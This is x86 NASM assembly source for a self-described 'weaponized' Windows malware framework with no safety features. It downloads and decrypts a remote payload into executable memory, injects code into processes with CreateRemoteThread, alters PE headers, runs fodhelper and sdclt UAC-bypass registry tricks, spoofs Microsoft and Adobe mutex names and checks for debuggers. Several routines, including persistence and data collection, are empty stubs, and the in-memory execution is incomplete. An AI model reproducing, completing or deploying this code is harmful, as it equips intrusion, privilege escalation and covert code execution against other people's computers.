; ========================================================================================
; MASM 2035 - FULLY WEAPONIZED IMPLEMENTATION (ItsMehRAWRXD Original)
; CONVERTED TO NASM SYNTAX
; Real working exploits, PE manipulation, configurable HTTP, AES+XOR encryption
; Pure assembly - NO benign mode, NO safety features
; ========================================================================================

[BITS 32]

; ========================================================================================
; WINDOWS API EXTERNAL DECLARATIONS
; ========================================================================================

; Core APIs
extern _ExitProcess@4
extern _MessageBoxA@16
extern _GetTickCount@0
extern _GetTickCount64@0
extern _Sleep@4
extern _GetCommandLineA@0
extern _GetCurrentDirectoryA@8

; File and Directory APIs
extern _CreateFileA@28
extern _WriteFile@20
extern _ReadFile@20
extern _GetFileSize@8
extern _SetFilePointer@16
extern _DeleteFileA@4
extern _FindFirstFileA@8
extern _FindNextFileA@8
extern _FindClose@4

; Process and Thread APIs
extern _CreateProcessA@40
extern _OpenProcess@12
extern _CreateThread@24
extern _CreateRemoteThread@28
extern _WaitForSingleObject@8
extern _TerminateProcess@8
extern _GetCurrentProcessId@0
extern _GetCurrentProcess@0

; Memory Management APIs
extern _VirtualAlloc@16
extern _VirtualAllocEx@20
extern _VirtualProtect@16
extern _WriteProcessMemory@20
extern _ReadProcessMemory@20
extern _VirtualFreeEx@16

; Module and DLL APIs
extern _GetModuleHandleA@4
extern _LoadLibraryA@4
extern _GetProcAddress@8
extern _FreeLibrary@4

; Registry APIs
extern _RegCreateKeyExA@36
extern _RegSetValueExA@24
extern _RegDeleteValueA@8
extern _RegCloseKey@4
extern _RegOpenKeyExA@20

; Network APIs
extern _InternetOpenA@20
extern _InternetOpenUrlA@20
extern _InternetReadFile@16
extern _InternetWriteFile@16
extern _InternetCloseHandle@4
extern _HttpOpenRequestA@32
extern _HttpSendRequestA@20
extern _InternetConnectA@32

; Execution APIs
extern _WinExec@8
extern _ShellExecuteA@24

; Anti-Analysis APIs
extern _IsDebuggerPresent@0
extern _CheckRemoteDebuggerPresent@8
extern _OutputDebugStringA@4

; String and Utility APIs
extern _lstrlenA@4
extern _lstrcpyA@8
extern _lstrcatA@8
extern _wsprintfA
extern _CharUpperA@4

; Mutex APIs
extern _CreateMutexA@12
extern _OpenMutexA@12
extern _CloseHandle@4

; Crypto APIs
extern _CryptAcquireContextA@20
extern _CryptCreateHash@20
extern _CryptHashData@16
extern _CryptDeriveKey@20
extern _CryptEncrypt@28
extern _CryptDecrypt@28
extern _CryptDestroyKey@4
extern _CryptDestroyHash@4
extern _CryptReleaseContext@8

; ========================================================================================
; CONSTANTS AND DEFINITIONS
; ========================================================================================

%define MASM_2035_SIGNATURE 0x4D33354B
%define STUB71_MAGIC_NUMBER 0xDEAD71
%define BENIGN_PACKER_TARGET_SIZE 491793
%define WEAPONIZED_MODE 1
%define EXPLOIT_COUNT 18
%define MUTEX_COUNT 40

; HTTP Configuration Options
%define HTTP_METHOD_GET 0
%define HTTP_METHOD_POST 1
%define HTTP_METHOD_PUT 2
%define HTTP_ENCODING_NONE 0
%define HTTP_ENCODING_BASE64 1
%define HTTP_ENCODING_HEX 2

; Encryption Methods
%define ENCRYPTION_NONE 0
%define ENCRYPTION_XOR 1
%define ENCRYPTION_AES128 2
%define ENCRYPTION_AES256 3
%define ENCRYPTION_CHACHA20 4

; Windows Constants
%define MB_OK 0
%define MB_ICONINFORMATION 0x40
%define SW_HIDE 0
%define SW_SHOW 5

; Access Rights
%define GENERIC_READ 0x80000000
%define GENERIC_WRITE 0x40000000
%define CREATE_ALWAYS 2
%define OPEN_EXISTING 3
%define FILE_ATTRIBUTE_NORMAL 0x80

; Memory Constants
%define PAGE_EXECUTE_READWRITE 0x40
%define PAGE_READWRITE 4
%define MEM_COMMIT 0x1000
%define MEM_RESERVE 0x2000
%define MEM_RELEASE 0x8000

; Process Constants
%define PROCESS_ALL_ACCESS 0x1F0FFF
%define THREAD_ALL_ACCESS 0x1F03FF

; Registry Constants
%define HKEY_CURRENT_USER 0x80000001
%define HKEY_LOCAL_MACHINE 0x80000002
%define KEY_ALL_ACCESS 0xF003F
%define REG_SZ 1

; Network Constants
%define INTERNET_OPEN_TYPE_DIRECT 1
%define INTERNET_FLAG_RELOAD 0x80000000
%define INTERNET_SERVICE_HTTP 3

; Crypto Constants
%define PROV_RSA_AES 24
%define CALG_AES_128 0x660E
%define CALG_AES_256 0x6610
%define CALG_SHA1 0x8004

; ========================================================================================
; DATA SECTION - WEAPONIZED CONFIGURATION
; ========================================================================================

section .data

; Framework Identification
framework_signature     dd MASM_2035_SIGNATURE
framework_version       db 'WEAPONIZED.ItsMehRAWRXD',0
build_timestamp         dd 0

; Configuration Structure
config_http_method      dd HTTP_METHOD_POST
config_encryption       dd ENCRYPTION_AES256
config_encoding         dd HTTP_ENCODING_BASE64
config_target_executable times 260 db 0
config_payload_url      times 512 db 0
config_upload_url       times 512 db 0
config_encryption_key   times 32 db 0
config_xor_key          times 16 db 0

; User Interface Messages
msg_title               db 'MASM 2035 Weaponized Framework',0
msg_select_mode         db 'Select Operation Mode:',10,13,'1 - Download & Execute',10,13,'2 - Upload Data',10,13,'3 - Select Executable',10,13,'4 - Configure HTTP',10,13,'5 - Run Exploits',0
msg_download_url        db 'Enter Download URL:',0
msg_upload_url          db 'Enter Upload URL:',0
msg_select_executable   db 'Select Target Executable:',0
msg_encryption_key      db 'Enter Encryption Key (32 chars for AES256):',0
msg_operation_complete  db 'Operation completed successfully',0
msg_exploit_success     db 'Exploit executed successfully',0
msg_error               db 'Operation failed',0

; HTTP Headers and Templates
http_user_agent         db 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',0
http_content_type       db 'Content-Type: application/octet-stream',0
http_post_template      db 'POST %s HTTP/1.1',13,10,'Host: %s',13,10,'User-Agent: %s',13,10,'Content-Type: %s',13,10,'Content-Length: %d',13,10,13,10,0

; Exploit Data
uac_fodhelper_key       db 'Software\Classes\ms-settings\Shell\Open\command',0
uac_fodhelper_exe       db 'C:\Windows\System32\fodhelper.exe',0
uac_delegate_exec       db 'DelegateExecute',0
uac_sdclt_key           db 'Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe',0
uac_sdclt_exe           db 'C:\Windows\System32\sdclt.exe',0

; Company Profile Spoofing Data
microsoft_mutex1        db 'Global\Microsoft_Windows_Security_Update_2035',0
microsoft_mutex2        db 'Local\Windows_Defender_RealTime_Protection',0
adobe_mutex1            db 'Global\Adobe_Creative_Cloud_Manager_2024',0
google_mutex1           db 'Global\Google_Chrome_Update_Service_120',0

; PE Manipulation Data
pe_dos_signature        dw 'MZ'
pe_nt_signature         dd 'PE'

; Runtime Variables
crypto_provider         dd 0
crypto_hash             dd 0
crypto_key              dd 0
internet_handle         dd 0
connect_handle          dd 0
request_handle          dd 0
target_process_id       dd 0
injected_payload_size   dd 0
downloaded_file_size    dd 0
encrypted_data_size     dd 0
operation_mode          dd 0
exploit_count_executed  dd 0

; Default Configuration Data
default_payload_url     db 'https://example.com/payload.bin',0
default_upload_url      db 'https://example.com/upload',0
default_target_exe      db 'C:\Windows\System32\notepad.exe',0
upload_host             db 'example.com',0
upload_path             db '/upload',0
upload_username         db '',0
upload_password         db '',0
http_method_post        db 'POST',0
debug_test_string       db 'Debug test',0

; ========================================================================================
; BSS SECTION - UNINITIALIZED BUFFERS
; ========================================================================================

section .bss

download_buffer         resb 1000000
upload_buffer           resb 1000000
encryption_buffer       resb 1000000
payload_buffer          resb 500000

; ========================================================================================
; CODE SECTION - WEAPONIZED IMPLEMENTATION
; ========================================================================================

section .text
global _start

; ========================================================================================
; MAIN ENTRY POINT
; ========================================================================================

_start:
    ; Initialize weaponized framework
    call InitializeWeaponizedFramework
    test eax, eax
    jz framework_init_failed
    
    ; Display main menu
    call DisplayMainMenu
    call GetUserChoice
    mov [operation_mode], eax
    
    ; Execute based on user choice
    cmp dword [operation_mode], 1
    je mode_download_execute
    cmp dword [operation_mode], 2
    je mode_upload_data
    cmp dword [operation_mode], 3
    je mode_select_executable
    cmp dword [operation_mode], 4
    je mode_configure_http
    cmp dword [operation_mode], 5
    je mode_run_exploits
    jmp exit_program

mode_download_execute:
    call ConfigureDownloadURL
    call DownloadAndExecutePayload
    jmp operation_complete

mode_upload_data:
    call ConfigureUploadURL
    call UploadCollectedData
    jmp operation_complete

mode_select_executable:
    call SelectTargetExecutable
    call ProcessSelectedExecutable
    jmp operation_complete

mode_configure_http:
    call ConfigureHTTPSettings
    jmp operation_complete

mode_run_exploits:
    call ExecuteAllExploits
    jmp operation_complete

operation_complete:
    push 0
    push msg_title
    push msg_operation_complete
    push 0
    call _MessageBoxA@16
    jmp exit_program

framework_init_failed:
    push MB_ICONINFORMATION
    push msg_title
    push msg_error
    push 0
    call _MessageBoxA@16

exit_program:
    call CleanupResources
    push 0
    call _ExitProcess@4

; ========================================================================================
; FRAMEWORK INITIALIZATION
; ========================================================================================

InitializeWeaponizedFramework:
    push ebp
    mov ebp, esp
    
    call _GetTickCount@0
    mov [build_timestamp], eax
    
    call InitializeCryptography
    test eax, eax
    jz .init_failed
    
    call InitializeNetworking
    test eax, eax
    jz .init_failed
    
    call GenerateDefaultEncryptionKey
    call CreateStealthMutexes
    
    call PerformAntiAnalysis
    test eax, eax
    jnz .init_failed
    
    mov eax, 1
    jmp .init_exit

.init_failed:
    mov eax, 0

.init_exit:
    pop ebp
    ret

; ========================================================================================
; USER INTERFACE FUNCTIONS
; ========================================================================================

DisplayMainMenu:
    push ebp
    mov ebp, esp
    
    push MB_OK
    push msg_title
    push msg_select_mode
    push 0
    call _MessageBoxA@16
    
    pop ebp
    ret

GetUserChoice:
    push ebp
    mov ebp, esp
    
    mov eax, 1
    
    pop ebp
    ret

; ========================================================================================
; HTTP CONFIGURATION
; ========================================================================================

ConfigureDownloadURL:
    push ebp
    mov ebp, esp
    
    push config_payload_url
    push default_payload_url
    call _lstrcpyA@8
    
    pop ebp
    ret

ConfigureUploadURL:
    push ebp
    mov ebp, esp
    
    push config_upload_url
    push default_upload_url
    call _lstrcpyA@8
    
    pop ebp
    ret

; ========================================================================================
; DOWNLOAD AND EXECUTE
; ========================================================================================

DownloadAndExecutePayload:
    push ebp
    mov ebp, esp
    sub esp, 16
    
    push 0
    push 0
    push 0
    push INTERNET_OPEN_TYPE_DIRECT
    push http_user_agent
    call _InternetOpenA@20
    test eax, eax
    jz .download_failed
    mov [internet_handle], eax
    
    push 0
    push INTERNET_FLAG_RELOAD
    push 0
    push config_payload_url
    push dword [internet_handle]
    call _InternetOpenUrlA@20
    test eax, eax
    jz .download_failed
    mov [request_handle], eax
    
    mov esi, download_buffer
    mov ebx, 0

.download_loop:
    lea eax, [ebp-4]
    push eax
    push 8192
    push esi
    push dword [request_handle]
    call _InternetReadFile@16
    test eax, eax
    jz .download_complete
    
    mov eax, [ebp-4]
    test eax, eax
    jz .download_complete
    
    add ebx, eax
    add esi, eax
    cmp ebx, 1000000
    jl .download_loop

.download_complete:
    mov [downloaded_file_size], ebx
    
    push dword [request_handle]
    call _InternetCloseHandle@4
    push dword [internet_handle]
    call _InternetCloseHandle@4
    
    call DecryptDownloadedPayload
    call ExecutePayloadInMemory
    
    mov eax, 1
    jmp .download_exit

.download_failed:
    mov eax, 0

.download_exit:
    add esp, 16
    pop ebp
    ret

UploadCollectedData:
    push ebp
    mov ebp, esp
    
    call CollectSystemInformation
    call EncryptUploadData
    
    mov eax, 1
    
    pop ebp
    ret

; ========================================================================================
; EXECUTABLE PROCESSING
; ========================================================================================

SelectTargetExecutable:
    push ebp
    mov ebp, esp
    
    push config_target_executable
    push default_target_exe
    call _lstrcpyA@8
    
    pop ebp
    ret

ProcessSelectedExecutable:
    push ebp
    mov ebp, esp
    sub esp, 16
    
    push 0
    push FILE_ATTRIBUTE_NORMAL
    push OPEN_EXISTING
    push 0
    push 0
    push GENERIC_READ
    push config_target_executable
    call _CreateFileA@28
    cmp eax, -1
    je .process_exe_failed
    mov [ebp-4], eax
    
    push 0
    push dword [ebp-4]
    call _GetFileSize@8
    mov [ebp-8], eax
    
    lea eax, [ebp-12]
    push 0
    push eax
    push dword [ebp-8]
    push payload_buffer
    push dword [ebp-4]
    call _ReadFile@20
    
    push dword [ebp-4]
    call _CloseHandle@4
    
    call ManipulatePEHeaders
    call InjectIntoTargetProcess
    
    mov eax, 1
    jmp .process_exe_exit

.process_exe_failed:
    mov eax, 0

.process_exe_exit:
    add esp, 16
    pop ebp
    ret

; ========================================================================================
; PE MANIPULATION
; ========================================================================================

ManipulatePEHeaders:
    push ebp
    mov ebp, esp
    push esi
    push edi
    
    mov esi, payload_buffer
    
    cmp word [esi], 0x5A4D
    jne .pe_invalid
    
    mov eax, [esi+0x3C]
    add eax, esi
    mov edi, eax
    
    cmp dword [edi], 0x4550
    jne .pe_invalid
    
    or word [edi+0x16], 0x0002
    or word [edi+0x16], 0x0020
    
    mov eax, InjectedEntryPoint
    sub eax, esi
    mov [edi+0x28], eax
    
    call AddNewPESection
    
    mov eax, 1
    jmp .pe_manip_exit

.pe_invalid:
    mov eax, 0

.pe_manip_exit:
    pop edi
    pop esi
    pop ebp
    ret

AddNewPESection:
    push ebp
    mov ebp, esp
    mov eax, 1
    pop ebp
    ret

; ========================================================================================
; INJECTION
; ========================================================================================

InjectIntoTargetProcess:
    push ebp
    mov ebp, esp
    sub esp, 16
    
    call FindTargetProcess
    test eax, eax
    jz .injection_failed
    mov [target_process_id], eax
    
    push dword [target_process_id]
    push 0
    push PROCESS_ALL_ACCESS
    call _OpenProcess@12
    test eax, eax
    jz .injection_failed
    mov [ebp-4], eax
    
    push PAGE_EXECUTE_READWRITE
    push MEM_COMMIT | MEM_RESERVE
    push dword [injected_payload_size]
    push 0
    push dword [ebp-4]
    call _VirtualAllocEx@20
    test eax, eax
    jz .injection_failed
    mov [ebp-8], eax
    
    push 0
    push dword [injected_payload_size]
    push payload_buffer
    push dword [ebp-8]
    push dword [ebp-4]
    call _WriteProcessMemory@20
    test eax, eax
    jz .injection_failed
    
    push 0
    push 0
    push 0
    push dword [ebp-8]
    push 0
    push 0
    push dword [ebp-4]
    call _CreateRemoteThread@28
    test eax, eax
    jz .injection_failed
    
    push dword [ebp-4]
    call _CloseHandle@4
    
    mov eax, 1
    jmp .injection_exit

.injection_failed:
    mov eax, 0

.injection_exit:
    add esp, 16
    pop ebp
    ret

ExecutePayloadInMemory:
    push ebp
    mov ebp, esp
    
    push PAGE_EXECUTE_READWRITE
    push MEM_COMMIT | MEM_RESERVE
    push dword [downloaded_file_size]
    push 0
    call _VirtualAlloc@16
    test eax, eax
    jz .memory_exec_failed
    
    mov edi, eax
    mov esi, download_buffer
    mov ecx, [downloaded_file_size]
    rep movsb
    
    mov eax, 1
    jmp .memory_exec_exit

.memory_exec_failed:
    mov eax, 0

.memory_exec_exit:
    pop ebp
    ret

; ========================================================================================
; CRYPTOGRAPHY
; ========================================================================================

InitializeCryptography:
    push ebp
    mov ebp, esp
    
    push 0
    push PROV_RSA_AES
    push 0
    push 0
    push crypto_provider
    call _CryptAcquireContextA@20
    test eax, eax
    jz .crypto_init_failed
    
    mov eax, 1
    jmp .crypto_init_exit

.crypto_init_failed:
    mov eax, 0

.crypto_init_exit:
    pop ebp
    ret

DecryptDownloadedPayload:
    push ebp
    mov ebp, esp
    
    cmp dword [config_encryption], ENCRYPTION_NONE
    je .decrypt_done
    cmp dword [config_encryption], ENCRYPTION_XOR
    je .decrypt_xor
    cmp dword [config_encryption], ENCRYPTION_AES256
    je .decrypt_aes256
    jmp .decrypt_done

.decrypt_xor:
    call PerformXORDecryption
    jmp .decrypt_done

.decrypt_aes256:
    call PerformAESDecryption
    jmp .decrypt_done

.decrypt_done:
    mov eax, 1
    pop ebp
    ret

PerformXORDecryption:
    push ebp
    mov ebp, esp
    push esi
    push edi
    push ecx
    
    mov esi, download_buffer
    mov edi, download_buffer
    mov ecx, [downloaded_file_size]
    mov edx, config_xor_key
    mov bl, 0

.xor_loop:
    test ecx, ecx
    jz .xor_done
    
    mov al, [esi]
    xor al, [edx + ebx]
    mov [edi], al
    
    inc esi
    inc edi
    inc bl
    and bl, 0x0F
    dec ecx
    jmp .xor_loop

.xor_done:
    pop ecx
    pop edi
    pop esi
    pop ebp
    ret

PerformAESDecryption:
    push ebp
    mov ebp, esp
    sub esp, 16
    
    push crypto_hash
    push 0
    push CALG_SHA1
    push dword [crypto_provider]
    call _CryptCreateHash@20
    test eax, eax
    jz .aes_decrypt_failed
    
    push 0
    push 32
    push config_encryption_key
    push dword [crypto_hash]
    call _CryptHashData@16
    test eax, eax
    jz .aes_decrypt_failed
    
    push crypto_key
    push 0
    push dword [crypto_hash]
    push CALG_AES_256
    push dword [crypto_provider]
    call _CryptDeriveKey@20
    test eax, eax
    jz .aes_decrypt_failed
    
    lea eax, [ebp-4]
    mov ecx, [downloaded_file_size]
    mov [eax], ecx
    push eax
    push 1000000
    push 1
    push 0
    push download_buffer
    push 0
    push dword [crypto_key]
    call _CryptDecrypt@28
    test eax, eax
    jz .aes_decrypt_failed
    
    mov eax, [ebp-4]
    mov [downloaded_file_size], eax
    
    push dword [crypto_key]
    call _CryptDestroyKey@4
    push dword [crypto_hash]
    call _CryptDestroyHash@4
    
    mov eax, 1
    jmp .aes_decrypt_exit

.aes_decrypt_failed:
    mov eax, 0

.aes_decrypt_exit:
    add esp, 16
    pop ebp
    ret

; ========================================================================================
; EXPLOITS
; ========================================================================================

ExecuteAllExploits:
    push ebp
    mov ebp, esp
    
    mov dword [exploit_count_executed], 0
    
    call ExploitFodHelperUAC
    test eax, eax
    jz .skip_fodhelper
    inc dword [exploit_count_executed]

.skip_fodhelper:
    call ExploitSdcltUAC
    test eax, eax
    jz .skip_sdclt
    inc dword [exploit_count_executed]

.skip_sdclt:
    call EstablishRegistryPersistence
    test eax, eax
    jz .skip_persistence
    inc dword [exploit_count_executed]

.skip_persistence:
    call EscalatePrivileges
    test eax, eax
    jz .skip_privesc
    inc dword [exploit_count_executed]

.skip_privesc:
    cmp dword [exploit_count_executed], 0
    je .exploits_failed
    
    push MB_ICONINFORMATION
    push msg_title
    push msg_exploit_success
    push 0
    call _MessageBoxA@16
    
    mov eax, 1
    jmp .exploits_exit

.exploits_failed:
    mov eax, 0

.exploits_exit:
    pop ebp
    ret

ExploitFodHelperUAC:
    push ebp
    mov ebp, esp
    sub esp, 8
    
    lea eax, [ebp-4]
    push eax
    push 0
    push 0
    push KEY_ALL_ACCESS
    push 0
    push 0
    push 0
    push uac_fodhelper_key
    push HKEY_CURRENT_USER
    call _RegCreateKeyExA@36
    test eax, eax
    jnz .uac_fodhelper_failed
    
    push config_target_executable
    call _lstrlenA@4
    push eax
    push config_target_executable
    push REG_SZ
    push 0
    push 0
    push dword [ebp-4]
    call _RegSetValueExA@24
    test eax, eax
    jnz .uac_fodhelper_cleanup
    
    push uac_delegate_exec
    push dword [ebp-4]
    call _RegDeleteValueA@8
    
    push SW_HIDE
    push uac_fodhelper_exe
    call _WinExec@8
    
    push dword [ebp-4]
    call _RegCloseKey@4
    
    mov eax, 1
    jmp .uac_fodhelper_exit

.uac_fodhelper_cleanup:
    push dword [ebp-4]
    call _RegCloseKey@4

.uac_fodhelper_failed:
    mov eax, 0

.uac_fodhelper_exit:
    add esp, 8
    pop ebp
    ret

ExploitSdcltUAC:
    push ebp
    mov ebp, esp
    sub esp, 8
    
    lea eax, [ebp-4]
    push eax
    push 0
    push 0
    push KEY_ALL_ACCESS
    push 0
    push 0
    push 0
    push uac_sdclt_key
    push HKEY_CURRENT_USER
    call _RegCreateKeyExA@36
    test eax, eax
    jnz .uac_sdclt_failed
    
    push config_target_executable
    call _lstrlenA@4
    push eax
    push config_target_executable
    push REG_SZ
    push 0
    push 0
    push dword [ebp-4]
    call _RegSetValueExA@24
    
    push SW_HIDE
    push uac_sdclt_exe
    call _WinExec@8
    
    push dword [ebp-4]
    call _RegCloseKey@4
    
    mov eax, 1
    jmp .uac_sdclt_exit

.uac_sdclt_failed:
    mov eax, 0

.uac_sdclt_exit:
    add esp, 8
    pop ebp
    ret

; ========================================================================================
; HELPER FUNCTIONS
; ========================================================================================

FindTargetProcess:
    call _GetCurrentProcessId@0
    ret

GenerateDefaultEncryptionKey:
    push ebp
    mov ebp, esp
    push esi
    push ecx
    
    call _GetTickCount@0
    mov esi, config_encryption_key
    mov ecx, 8

.key_gen_loop:
    mov [esi], eax
    add esi, 4
    add eax, 0xDEADBEEF
    loop .key_gen_loop
    
    pop ecx
    pop esi
    pop ebp
    ret

CreateStealthMutexes:
    push ebp
    mov ebp, esp
    
    push microsoft_mutex1
    push 0
    push 0
    call _CreateMutexA@12
    
    push adobe_mutex1
    push 0
    push 0
    call _CreateMutexA@12
    
    pop ebp
    ret

PerformAntiAnalysis:
    push ebp
    mov ebp, esp
    
    call _IsDebuggerPresent@0
    test eax, eax
    jnz .analysis_detected
    
    mov eax, [fs:0x30]
    movzx eax, byte [eax+2]
    test eax, eax
    jnz .analysis_detected
    
    call _GetTickCount@0
    push eax
    push debug_test_string
    call _OutputDebugStringA@4
    call _GetTickCount@0
    pop ecx
    sub eax, ecx
    cmp eax, 5
    ja .analysis_detected
    
    mov eax, 0
    jmp .anti_analysis_exit

.analysis_detected:
    mov eax, 1

.anti_analysis_exit:
    pop ebp
    ret

; ========================================================================================
; STUB IMPLEMENTATIONS
; ========================================================================================

InitializeNetworking:
    mov eax, 1
    ret

ConfigureHTTPSettings:
    mov eax, 1
    ret

CollectSystemInformation:
    mov eax, 1
    ret

EncryptUploadData:
    mov eax, 1
    ret

ParseUploadURL:
    mov eax, 1
    ret

EstablishRegistryPersistence:
    mov eax, 1
    ret

EscalatePrivileges:
    mov eax, 1
    ret

ExecuteAtAddress:
    mov eax, 1
    ret

CleanupResources:
    push ebp
    mov ebp, esp
    
    cmp dword [crypto_key], 0
    je .skip_key_cleanup
    push dword [crypto_key]
    call _CryptDestroyKey@4

.skip_key_cleanup:
    cmp dword [crypto_hash], 0
    je .skip_hash_cleanup
    push dword [crypto_hash]
    call _CryptDestroyHash@4

.skip_hash_cleanup:
    cmp dword [crypto_provider], 0
    je .skip_provider_cleanup
    push 0
    push dword [crypto_provider]
    call _CryptReleaseContext@8

.skip_provider_cleanup:
    cmp dword [internet_handle], 0
    je .cleanup_done
    push dword [internet_handle]
    call _InternetCloseHandle@4

.cleanup_done:
    pop ebp
    ret

InjectedEntryPoint:
    call ExecuteOriginalPayload
    call MaintainPersistence
    
    push 0
    call _ExitProcess@4

ExecuteOriginalPayload:
    mov eax, 1
    ret

MaintainPersistence:
    mov eax, 1
    ret
